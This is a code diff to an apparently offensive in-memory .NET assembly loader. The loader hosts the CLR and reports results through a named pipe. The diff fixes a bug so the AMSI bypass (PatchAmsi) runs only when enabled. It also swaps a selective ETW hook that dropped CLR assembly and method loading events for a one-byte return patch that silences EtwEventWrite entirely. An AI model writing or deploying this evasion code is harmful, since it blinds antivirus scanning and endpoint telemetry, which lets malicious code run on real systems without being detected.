@@ -19,13 +19,12 @@
 #define MethodJittingStarted 145
 #define ILStubGenerated 88
 
-#define ReportErrorThroughPipe(pipe, format, ...) {char buf[1024]; DWORD written; snprintf(buf, 1024, format, __VA_ARGS__); WriteFile(pipe, buf, strlen(buf), &written, NULL);}
+#define ReportErrorThroughPipe(pipe, format, ...) {char buf[1024]; DWORD written; snprintf(buf, 1024, format, __VA_ARGS__); WriteFile(pipe, buf, (DWORD)strlen(buf), &written, NULL);}
 
 // mov rax, <Hooked function address>  
 // jmp rax
 unsigned char uHook[] = {
-	0x48, 0xb8, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-	0xFF, 0xE0
+	0xC3
 };
 
 #ifdef _X32
@@ -60,6 +59,7 @@ int executeSharp(LPVOID lpPayload)
 	ICorRuntimeHost* pRuntimeHost = NULL;
 	IUnknownPtr pAppDomainThunk = NULL;
 	_AppDomainPtr pCustomAppDomain = NULL;
+	IEnumUnknown* pEnumerator = NULL;
 	_AssemblyPtr pAssembly = NULL;
 	SAFEARRAYBOUND rgsabound[1];
 	_MethodInfoPtr pMethodInfo = NULL;
@@ -183,7 +183,7 @@ int executeSharp(LPVOID lpPayload)
 	FARPROC clrCreateInstance = GetProcAddress(hMscoree, "CLRCreateInstance");
 	if (clrCreateInstance == NULL)
 	{
-		ReportErrorThroughPipe(pipe, "[CLRHOST] CLRCreateInstance not present on this system.\n", hr);
+		ReportErrorThroughPipe(pipe, "[CLRHOST] CLRCreateInstance not present on this system.\n");
 		goto Cleanup;
 	}
 	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);
@@ -194,7 +194,6 @@ int executeSharp(LPVOID lpPayload)
 		goto Cleanup;
 	}
 
-	IEnumUnknown* pEnumerator;
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
 	hr = pMetaHost->EnumerateLoadedRuntimes(hProcess, &pEnumerator);
 
@@ -264,8 +263,8 @@ int executeSharp(LPVOID lpPayload)
 		goto Cleanup;
 	}
 
-	//Amsi bypass
-	if (metadata.amsiBypass);
+	// Amsi bypass
+	if (metadata.amsiBypass)
 	{
 		int ptcResult = PatchAmsi(pipe);
 		if (ptcResult == -1)
@@ -335,10 +334,10 @@ int executeSharp(LPVOID lpPayload)
 	}
 	else
 	{
-		//if no parameters set cEleemnt to 0
+		// if no parameters set cEleemnt to 0
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
 	}
-	//Assembly execution
+	// Assembly execution
 	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
 	if (FAILED(hr))
 	{
@@ -361,6 +360,7 @@ Cleanup:
 	if (pRuntimeInfo) {
 		pRuntimeInfo->Release();
 	}
+
 	if (pRuntimeHost) {
 		if (pCustomAppDomain) {
 			pRuntimeHost->UnloadDomain(pCustomAppDomain);
@@ -394,7 +394,6 @@ Cleanup:
 		delete[] appdomainName_w;
 	}
 
-	
 	return hr;
 }
 
@@ -415,38 +414,6 @@ VOID Execute(LPVOID lpPayload)
 	SetStdHandle(STD_OUTPUT_HANDLE, stdOut);
 	SetStdHandle(STD_ERROR_HANDLE, stdErr);
 
-}
-
-ULONG NTAPI MyEtwEventWrite(
-	__in REGHANDLE RegHandle,
-	__in PCEVENT_DESCRIPTOR EventDescriptor,
-	__in ULONG UserDataCount,
-	__in_ecount_opt(UserDataCount) PEVENT_DATA_DESCRIPTOR UserData)
-{
-	ULONG uResult = 0;
-
-	_EtwEventWriteFull EtwEventWriteFull = (_EtwEventWriteFull)
-		GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWriteFull");
-	if (EtwEventWriteFull == NULL) {
-		return 1;
-	}
-
-	switch (EventDescriptor->Id) {
-	case AssemblyDCStart_V1:
-		// Block CLR assembly loading events.
-		break;
-	case MethodLoadVerbose_V1:
-		// Block CLR method loading events.
-		break;
-	case ILStubGenerated:
-		// Block MSIL stub generation events.
-		break;
-	default:
-		// Forward all other ETW events using EtwEventWriteFull.
-		uResult = EtwEventWriteFull(RegHandle, EventDescriptor, 0, NULL, NULL, UserDataCount, UserData);
-	}
-
-	return uResult;
 }
 
 INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
@@ -520,9 +487,6 @@ BOOL PatchEtw(HANDLE pipe)
 		ReportErrorThroughPipe(pipe, "[CLRHOST] Cannot get address of EtwEventWrite");
 		return -2;
 	}
-
-	// Add address of hook function to patch.
-	*(DWORD64*)&uHook[2] = (DWORD64)MyEtwEventWrite;
 
 	return InlinePatch(lpFuncAddress, uHook, sizeof(uHook));
 }
